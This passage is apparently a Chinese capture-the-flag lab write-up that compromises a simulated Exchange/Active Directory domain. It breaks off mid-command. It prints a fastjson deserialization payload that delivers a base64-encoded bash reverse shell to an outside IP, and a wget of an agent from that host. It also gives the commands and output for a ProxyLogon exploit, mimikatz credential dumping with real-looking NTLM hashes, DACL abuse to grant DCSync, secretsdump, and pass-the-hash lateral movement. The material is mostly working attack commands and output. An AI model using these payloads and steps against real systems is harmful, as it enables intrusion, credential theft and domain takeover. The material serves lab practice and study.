src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c906c1331d2f63d8965eafb50ab08d3a.png"></p><p>弱密码登陆<code>admin/123456</code></p><p>注册一个新的再登陆也行</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/936fe75554a67d8d67d4b04bd8e5d01c.png"></p><p>后台有个fastjson反序列化的洞。poc如下，注意要url编码后发送：</p><pre class="line-numbers language-none"><code class="language-none">{"@type":"java.net.Inet4Address","val":"fvnp2k.dnslog.cn"} <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行urldns链检测</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/47.105.34.179/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMzQuMTc5Lzc3NzcgMD4mMQ==GET /user/list?search={{url({"@type": "java.lang.AutoCloseable","@type": "com.mysql.jdbc.JDBC4Connection","hostToConnectTo": "47.105.34.179","portToConnectTo": 3306,"info": {"user": "yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMzQuMTc5Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}",         "password": "pass",         "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",         "autoDeserialize": "true",         "NUM_HOSTS": "1"     } })}}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">GET /depotHead/list?search={{url({"name": {"@type": "java.lang.AutoCloseable","@type": "com.mysql.jdbc.JDBC4Connection","hostToConnectTo": "47.105.34.179","portToConnectTo": 3366,"info": {"user": "yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMzQuMTc5Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}","password": "pass","statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize": "true","NUM_HOSTS": "1"}})}}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/4ra1n/mysql-fake-server.git（这个不知道为啥不行）mvn packagejava -jar fake-mysql-cli-0.0.4.jar -p 3306mv ysoserial-all.jar /root/./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar（记得是在https://github.com/dushixiang/evil-mysql-server/releases/download/v0.0.2/evil-mysql-server_0.0.2_linux_386.tar.gz）root@iZm5eh0goysydu2u3hlp07Z:~/evil-mysql-server# ./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar-bash: ./evil-mysql-server: Permission deniedroot@iZm5eh0goysydu2u3hlp07Z:~/evil-mysql-server# chmod 777 evil-mysql-serverroot@iZm5eh0goysydu2u3hlp07Z:~/evil-mysql-server# ./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar2025/08/15 21:26:20 [-] evil mysql server v0.0.2 listen on 0.0.0.0:33662025/08/15 21:30:17 [+] new client connected : 39.98.109.189:464802025/08/15 21:30:17 [√] write greeting success.2025/08/15 21:30:17 [-] username: yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMzQuMTc5Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}2025/08/15 21:30:17 [-] request query statement: SHOW SESSION STATUS2025/08/15 21:30:17 [-] exec: /usr/bin/java -jar ysoserial-all.jar CommonsCollections6 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMzQuMTc5Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}2025/08/15 21:30:17 [√] write payload success.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80wget http://47.105.34.179/linux_x64_agent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.98.109.189:7879 -s 123./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/fscan_all_version/fscan /tmp/1/fscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">root@iZ8vbikht4eej7zhaws4dsZ:/tmp/1# ifconfigifconfigeth0      Link encap:Ethernet  HWaddr 00:16:3e:13:e3:04            inet addr:172.22.3.12  Bcast:172.22.255.255  Mask:255.255.0.0          inet6 addr: fe80::216:3eff:fe13:e304/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:267479 errors:0 dropped:0 overruns:0 frame:0          TX packets:115051 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:273327358 (273.3 MB)  TX bytes:65384093 (65.3 MB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:8021 errors:0 dropped:0 overruns:0 frame:0          TX packets:8021 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1           RX bytes:1653138 (1.6 MB)  TX bytes:1653138 (1.6 MB)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">./fscan -h 172.22.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">download /tmp/1/result.txt /home/kali/result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]└─$ cat /home/kali/result.txt 172.22.3.9:80 open172.22.3.12:8000 open172.22.3.12:80 open172.22.3.12:22 open172.22.3.9:445 open172.22.3.26:445 open172.22.3.2:445 open172.22.3.9:443 open172.22.3.9:139 open172.22.3.26:139 open172.22.3.2:139 open172.22.3.9:135 open172.22.3.26:135 open172.22.3.2:135 open172.22.3.9:81 open172.22.3.9:8172 open172.22.3.2:88 open172.22.3.9:808 open[*] NetInfo [*]172.22.3.2   [-&gt;]XIAORANG-WIN16   [-&gt;]172.22.3.2[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia[*] NetInfo [*]172.22.3.26   [-&gt;]XIAORANG-PC   [-&gt;]172.22.3.26[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          [*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)[*] NetInfo [*]172.22.3.9   [-&gt;]XIAORANG-EXC01   [-&gt;]172.22.3.9[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         gWindows Server 2016 Datacenter 14393[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None[*] WebTitle http://172.22.3.9         code:403 len:0      title:None[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="172-22-3-2"><a href="#172-22-3-2" class="headerlink" title="172.22.3.2"></a>172.22.3.2</h4><ul><li><strong>网络信息</strong>：主机名 <code>XIAORANG-WIN16</code>，被标记为域控制器（<code>DC:XIAORANG-WIN16.xiaorang.lab</code>）。</li><li><strong>操作系统</strong>：<code>Windows Server 2016 Datacenter</code>（版本 14393），典型的域控服务器系统。</li><li><strong>开放端口</strong>：135、139、445、88（符合域控服务器的特征，88 端口用于 Kerberos 认证）。</li></ul><h4 id="2-172-22-3-9"><a href="#2-172-22-3-9" class="headerlink" title="2. 172.22.3.9"></a>2. 172.22.3.9</h4><ul><li><strong>网络信息</strong>：主机名 <code>XIAORANG-EXC01</code>，属于 <code>xiaorang.lab</code> 域。</li><li><strong>操作系统</strong>：通过 NetBios 信息推测为 <code>Windows Server 2016 Datacenter</code>。</li><li>开放服务80/443/81/8172：Web 服务，其中 <code>https://172.22.3.9</code> 跳转至 <code>Outlook</code> 登录页（可能是 Exchange 邮件服务器，符合主机名 <code>EXC01</code> 特征）。<ul><li>135/139/445：SMB 共享服务。</li></ul></li></ul><h4 id="3-172-22-3-12"><a href="#3-172-22-3-12" class="headerlink" title="3. 172.22.3.12"></a>3. 172.22.3.12</h4><ul><li>开放服务<ul><li>80 端口：Web 标题为 <code>lumia</code>，可能是一个名为 Lumia 的 Web 应用。</li><li>8000 端口：跳转至 <code>login.html</code>，标题为 <code>Lumia ERP</code>（企业资源计划系统，可能存在登录入口）。</li><li>22 端口：开放 SSH，可能是一台 Linux 服务器（或支持 SSH 的设备）。</li></ul></li></ul><h4 id="4-172-22-3-26"><a href="#4-172-22-3-26" class="headerlink" title="4. 172.22.3.26"></a>4. 172.22.3.26</h4><ul><li><strong>网络信息</strong>：主机名 <code>XIAORANG-PC</code>，属于 <code>XIAORANG</code> 工作组 / 域。</li><li><strong>开放端口</strong>：135、139、445（典型的 Windows 客户端或服务器，可能用于文件共享）。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5ee838f5f3c840b15457a31bd9b9f5c3.png"></p><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><pre class="line-numbers language-none"><code class="language-none">172.22.3.12     本机172.22.3.9      EXC01172.22.3.2      DC172.22.3.26     PC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后发现172.22.3.9是发现是Exchange Server 2016,直接打<a href="https://github.com/hausec/ProxyLogon">ProxyLogon</a></p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hausec/ProxyLogon.git  proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加一个账号然后rdp连接</p><pre class="line-numbers language-none"><code class="language-none">net user qaq pass@1234 /addnet localgroup administrators qaq /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains xfreerdp /u:qaq /p:pass@1234 /v:172.22.3.9 /cert:ignoreproxychains xfreerdp /u:qaq /p:pass@1234 /v:172.22.3.9 /cert:ignore /drive:kali,/home/kali（映射）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/Stotaway-bin/linux_x64_agent /tmp/1/linux_x64_agent39.98.109.189./windows_x64_admin.exe -c 39.98.109.189:7870 -s 123./linux_x64_agent -l 7870 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我不知道为什么用win连不上</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4877b50a3c5e64293f6e0ee990ea09fd.png"></p><p>或者用马</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/herwonowr/exprolog.git   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>传一个猕猴桃，以管理员身份运行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">log<span class="token class-name static-context">privilege</span><span class="token operator">::</span><span class="token constant">Debug</span> <span class="token class-name static-context">sekurlsa</span><span class="token operator">::</span><span class="token constant">logonpasswords</span> <span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="1-privilege-Debug"><a href="#1-privilege-Debug" class="headerlink" title="1. privilege::Debug"></a>1. <code>privilege::Debug</code></h3><ul><li><strong>功能</strong>：提升 Mimikatz 的权限至<code>SeDebugPrivilege</code>（调试权限）。</li><li><strong>作用</strong>：<code>SeDebugPrivilege</code> 是 Windows 系统中的高级权限，允许程序调试其他进程。Mimikatz 需要此权限才能读取 LSASS 进程（本地安全认证服务器，存储用户登录凭据）的内存数据，从而抓取密码。</li><li><strong>注意</strong>：如果当前用户没有足够权限启用此特权，命令可能会失败（需以管理员身份运行 Mimikatz）。</li></ul><h3 id="2-sekurlsa-logonpasswords"><a href="#2-sekurlsa-logonpasswords" class="headerlink" title="2. sekurlsa::logonpasswords"></a>2. <code>sekurlsa::logonpasswords</code></h3><ul><li><p><strong>功能</strong>：从 LSASS 进程内存中提取所有已登录用户的凭据信息。</p></li><li><p>获取内容</p><p>：包括但不限于：</p><ul><li>用户名（<code>Username</code>）</li><li>NTLM 哈希（<code>NTLM</code>）</li><li>LM 哈希（较旧的哈希算法，现代系统可能禁用）</li><li>明文密码（如果系统开启了 “可逆加密” 或使用了某些协议如 HTTP Basic Auth，可能抓取到明文）</li><li>登录类型（如交互式登录、远程桌面登录、服务登录等）。</li></ul></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">Using 'mimikatz.log' for logfile : OKmimikatz # privilege::Debug Privilege '20' OKmimikatz # sekurlsa::logonpasswordsAuthentication Id : 0 ; 15549863 (00000000:00ed45a7)Session           : Interactive from 5User Name         : DWM-5Domain            : Window ManagerLogon Server      : (null)Logon Time        : 2025/8/15 22:22:18SID               : S-1-5-90-0-5msv : [00000003] Primary * Username : XIAORANG-EXC01$ * Domain   : XIAORANG * NTLM     : 766a276a053f370d92eaf25c243f1124 * SHA1     : de47c096cd43e244984f43517ae52678d06318datspkg :wdigest : * Username : XIAORANG-EXC01$ * Domain   : XIAORANG * Password : (null)kerberos : * Username : XIAORANG-EXC01$ * Domain   : xiaorang.lab * Password : 6d f5 59 83 60 17 82 a3 88 89 d7 38 47 8a 89 68 e2 e4 ca 90 34 65 d0 18 b1 01 1f 54 2f 4e e9 87 25 c4 27 1a 12 94 e0 55 cf ad c9 a0 6f a0 c3 31 7d ce 1c 93 eb 62 6e 2c ff 70 a5 bc ba 26 c6 4e cf e5 a8 a9 4f d8 09 ea 47 23 95 30 36 29 53 8a f7 c3 db 3b 79 0c d4 03 2a 39 a7 eb fc 83 09 00 cb 0e 47 72 c8 76 f9 2c f6 23 26 ae 68 04 ba e2 a2 a8 c5 a0 cf 3d df bd 4c 51 e7 f9 6e 86 fc cc b3 b9 fd 9d 5f 46 62 e7 51 bc 2c 33 5c ef 0e 79 b7 2d fa c2 6e a0 27 60 e9 d6 65 49 e0 a1 cf d2 91 b5 44 6c ef 13 35 53 49 f6 e9 f2 00 d1 1c 2c d5 13 78 28 b9 d6 0f bb 47 7a 8c f5 2c 94 14 e5 62 42 46 63 f4 f6 04 a0 f1 c5 01 85 b6 d7 c4 b1 60 e1 9f 4f 92 0c 85 5b a0 c9 8d 99 19 1b 80 c3 c2 ce 08 39 21 28 f6 e2 b0 37 db 57 d6 d8 56 80 ssp :credman :...Authentication Id : 0 ; 1887841 (00000000:001cce61)Session           : RemoteInteractive from 2User Name         : ZhangtongDomain            : XIAORANGLogon Server      : XIAORANG-WIN16Logon Time        : 2025/8/15 20:20:16SID               : S-1-5-21-533686307-2117412543-4200729784-1147msv : [00000003] Primary * Username : Zhangtong * Domain   : XIAORANG * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83btspkg :wdigest : * Username : Zhangtong * Domain   : XIAORANG * Password : (null)kerberos : * Username : Zhangtong * Domain   : XIAORANG.LAB * Password : (null)ssp :credman :mimikatz # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里分别抓出了XIAORANG-EXC01$的哈希766a276a053f370d92eaf25c243f1124</p><pre class="line-numbers language-none"><code class="language-none">* Username : XIAORANG-EXC01$ * Domain   : XIAORANG * NTLM     : 766a276a053f370d92eaf25c243f1124 * SHA1     : de47c096cd43e244984f43517ae52678d06318da  * Username : Zhangtong * Domain   : XIAORANG * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和Zhangtong：22c7f81993e96ac83ac2f3f1903de8b4</p><blockquote><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :766a276a053f370d92eaf25c243f1124xiaorang.lab/administrator@172.22.6.25 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到这里，我们可以用XIAORANG-EXC01哈希登录一下（不知道为啥我登不上）</p><pre class="line-numbers language-none"><code class="language-none">proxychains xfreerdp /pth:766a276a053f370d92eaf25c243f1124 /u:XIAORANG-EXC01$ /v:172.22.3.9:3389 /:d:xiaorang.lab /drive:kali,/home/kaliproxychains xfreerdp /u:qaq /p:pass@1234 /v:172.22.3.9 /cert:ignore /drive:kali,/home/kali<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样就可以登录上XIAORANG-EXC01，然后用bloodhound分析一下发现EXC01机器账户默认对域内成员具有writeDacl权限，这个权限允许身份修改指定对象ACL，所以可以给Zhangtong修改个DCSync，然后就可以抓域控哈希了。（这里查了一下资料，DCSync，DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。所以当我们看到EXC01机器账户默认对域内成员具有writeDacl权限，所以EXC01机器就可以修改其他账户的ACL，从而使Zhangtong获得DCSync，从而就可以使用Zhangtong，来抓域控哈希了）</p><p>exchange机器账户隶属于Exchange Windows Permissions这个组中，而这个组具有write 域内acl权限，所以可以设置刚刚通过mimikatz拿到的域内用户Zhangtong的dcsync属性。</p></blockquote><p>不过可以用smb登上，类似这样</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/psexecset RHOSTS 172.22.3.9set SMBUser XIAORANG-EXC01$set SMBPass 00000000000000000000000000000000:766a276a053f370d92eaf25c243f1124set SMBDomain xiaorang.labset PAYLOAD windows/x64/meterpreter/bind_tcpset LPORT 54525run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但其实可以直接这样！<a href="https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">春秋云镜-Exchange-Writeup | Xrntkk’s Blog</a></p><pre class="line-numbers language-none"><code class="language-none">proxychains4 bloodhound-python -u "XIAORANG-EXC01$" --hashes :766a276a053f370d92eaf25c243f1124 -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>./BloodHound --no-sandbox</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b605c860a61ee04aa8b9a35abe0b27a2.png"><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/74c99ecf40475afc5173fa31f436c115.png"></p><p>找到这条线。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0791f15c5bf0cec423fda701cffebd10.png"></p><p>（这个更明显但我不知道怎么搞）</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c0660838f26a88bcdfb2e52b0577d90f.png"></p><p>（这里清除）</p><blockquote><ol><li><strong>机器账户（Machine Account）</strong><br>域内的每台计算机（比如服务器、客户端）在加入域时，会自动创建一个 “机器账户”（格式通常是<code>计算机名$</code>，比如<code>EXC01$</code>），用于这台机器在域内的身份认证（类似用户登录域用用户账户）。<br>你提到的<code>EXC01</code>是 Exchange 服务器，它的机器账户<code>EXC01$</code>就是这台服务器在域内的 “身份”。</li><li><strong>WriteDacl 权限</strong><br>ACL（Access Control List，访问控制列表）是域内对象（用户、计算机、组等）的 “权限清单”，记录了谁能对这个对象做什么操作（比如读取、修改、删除）。<br><code>WriteDacl</code>权限是一种高权限，拥有它意味着：<strong>可以修改目标对象的 ACL</strong>（简单说，就是能给别人 “加权限” 或 “减权限”）。</li><li><strong>DCSync</strong><br>域控制器（DC）需要和其他域内控制器同步用户数据（比如用户哈希、权限等），这个同步机制依赖特定的权限（如<code>Replicating Directory Changes</code>、<code>Replicating Directory Changes All</code>等）。<br>Mimikatz 的<code>DCSync</code>功能就是伪造这种 “同步请求”，让域控制器把用户哈希 “主动发过来”。但要执行<code>DCSync</code>，必须拥有上述同步权限（默认只有域管理员、域控制器本身等才有）。</li></ol><h3 id="二、整个流程的逻辑链条"><a href="#二、整个流程的逻辑链条" class="headerlink" title="二、整个流程的逻辑链条"></a>二、整个流程的逻辑链条</h3><p>你提到的场景可以拆解为 3 步，核心是 “利用已有权限给目标用户加关键权限”：</p><h4 id="1-Exchange-机器账户的特殊权限来源"><a href="#1-Exchange-机器账户的特殊权限来源" class="headerlink" title="1. Exchange 机器账户的特殊权限来源"></a>1. Exchange 机器账户的特殊权限来源</h4><p>Exchange 服务器（<code>EXC01</code>）的机器账户<code>EXC01$</code>默认属于<code>Exchange Windows Permissions</code>组。<br>这个组是域内为了让 Exchange 正常工作而设置的，<strong>默认被赋予了 “对域内对象的 WriteDacl 权限”</strong>（因为 Exchange 需要管理域内用户的邮件相关权限，所以需要修改部分对象的 ACL）。</p><p>→ 简单说：<code>EXC01$</code>（机器账户）因为在这个组里，所以拥有了 “修改域内其他对象 ACL” 的权力（WriteDacl）。</p><h4 id="2-给用户-Zhangtong-添加-DCSync-所需权限"><a href="#2-给用户-Zhangtong-添加-DCSync-所需权限" class="headerlink" title="2. 给用户 Zhangtong 添加 DCSync 所需权限"></a>2. 给用户 Zhangtong 添加 DCSync 所需权限</h4><p>既然<code>EXC01$</code>能修改域内对象的 ACL，那就能 “给指定用户加权限”。<br>这里选择给<code>Zhangtong</code>（一个普通域用户）添加<code>DCSync</code>所需的同步权限（<code>Replicating Directory Changes</code>等）。</p><p>→ 操作后：<code>Zhangtong</code>从一个普通用户，变成了 “有权限向域控制器请求同步用户哈希” 的用户。</p><h4 id="3-用-Zhangtong-执行-DCSync-抓域控哈希"><a href="#3-用-Zhangtong-执行-DCSync-抓域控哈希" class="headerlink" title="3. 用 Zhangtong 执行 DCSync 抓域控哈希"></a>3. 用 Zhangtong 执行 DCSync 抓域控哈希</h4><p>当<code>Zhangtong</code>有了 DCSync 权限后，就可以用 Mimikatz 以<code>Zhangtong</code>的身份执行<code>dcsync</code>命令，伪造同步请求。<br>域控制器会认为这是合法的同步操作，于是把域内所有用户（包括域管理员）的哈希发送给<code>Zhangtong</code>（实际被攻击者获取）。</p></blockquote><p>添加DCSync</p><pre class="line-numbers language-none"><code class="language-none">cd /usr/share/doc/python3-impacket/examples/proxychains impacket-dacledit xiaorang.lab/XIAORANG-EXC01\$ -hashes :766a276a053f370d92eaf25c243f1124  -action write -rights DCSync -principal Zhangtong -target-dn "DC=xiaorang,DC=lab" -dc-ip 172.22.3.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进行dcsync操作获取hash（抓哈希）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains python secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 <span class="token parameter variable">-hashes</span> :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d064a9f0abf30c8ed79b5b1da2f6a854.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/610db662b5c23867e2214d4274ebc21a.png"></p><p>或者登上再用猕猴桃</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\$@172.22.3.9 -hashes ':766a276a053f370d92eaf25c243f1124' -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>抓到了Administrator，还有Lumia的，后面要用</p><pre class="line-numbers language-none"><code class="language-none">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到域管hash，那我们接下来就可以随意横向了</p><p>pth域控。</p><pre class="line-numbers language-none"><code class="language-none">proxychains python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb ./Administ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dd2f2359d52a6594a51fd40e8bc1ac0a.png"></p><pre class="line-numbers language-none"><code class="language-none">type C:\Users\administrator\flag\flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ccc0aae9d170d9dbaaacad1df368343.png"></p><hr><h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>smbclient横向到26</p><pre class="line-numbers language-none"><code class="language-none">proxychains python smbclient.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># use c$# pwd/# cd /Users# lsdrw-rw-rw-          0  Sun Oct 23 08:22:41 2022 .drw-rw-rw-          0  Mon Aug 15 05:21:31 2022 ..drw-rw-rw-          0  Thu Aug 14 07:55:27 2025 Administratordrw-rw-rw-          0  Sun Oct 23 02:32:59 2022 All Usersdrw-rw-rw-          0  Sun Oct 23 02:33:41 2022 Defaultdrw-rw-rw-          0  Sun Oct 23 02:32:59 2022 Default User-rw-rw-rw-        174  Mon Aug 15 13:18:42 2022 desktop.inidrw-rw-rw-          0  Sun Oct 23 08:22:44 2022 Lumiadrw-rw-rw-          0  Mon Aug 15 05:22:10 2022 Public# cd Lumia# cd Desktop# lsdrw-rw-rw-          0  Sun Oct 23 09:40:24 2022 .drw-rw-rw-          0  Sun Oct 23 08:22:44 2022 ..-rw-rw-rw-        282  Sun Oct 23 08:22:55 2022 desktop.ini-rw-rw-rw-     668436  Sun Oct 23 09:40:16 2022 secret.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个压缩包</p><p><code>get secret.zip</code></p><p>利用<a href="https://github.com/Jumbo-WJB/PTH_Exchange%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8A%8ALumia%E7%9A%84%E9%82%AE%E4%BB%B6%E9%83%BD%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E3%80%82">https://github.com/Jumbo-WJB/PTH_Exchange的工具把Lumia的邮件都下载下来。</a></p><pre class="line-numbers language-none"><code class="language-none">git clone 